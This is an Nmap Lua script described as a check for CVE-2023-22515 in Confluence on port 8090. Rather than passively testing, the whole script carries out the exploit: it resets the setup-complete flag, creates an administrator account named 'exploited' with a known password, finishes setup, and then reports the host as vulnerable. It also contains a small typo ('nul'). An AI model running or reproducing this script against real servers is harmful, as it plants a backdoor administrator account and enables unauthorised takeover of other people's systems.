local http = require 'http'

description = [[
  Checking the presence of CVE-2023-22515
]]

author = "fyx1t"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit"}

portrule = function(host, port)
  return port.protocol == "tcp" and port.number == 8090
end

action = function(host, port)
  local output = {}
  local state = false

  -- настроить путь
  local path_trigger = '/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false'
  local path_admin = '/setup/setupadministrator.action'
  local body_admin = 'username=exploited&fullName=exploited&email=exploited@exploited.com&password=exploited&confirm=exploited&setup-next-button=Next'
  local path_finish = '/setup/finishsetup.action'

  -- Отправить GET-запрос
  local response_trigger = http.get(host, port, path_trigger)
  if response_trigger.status == 200 then
    local response_admin = http.post(host, port, path_admin, {}, nil, body_admin)
    if response_admin.status == 200 then
        local response_finish = http.post(host, port, path_finish, {}, nul, '')
        state = true
    end
  end

  if state == true then
    output[#output + 1] = "Host is vulnerable to CVE-2023-22515"
  else
    output[#output + 1] = "Host is not vulnerable to CVE-2023-22515"
  end

  return output
end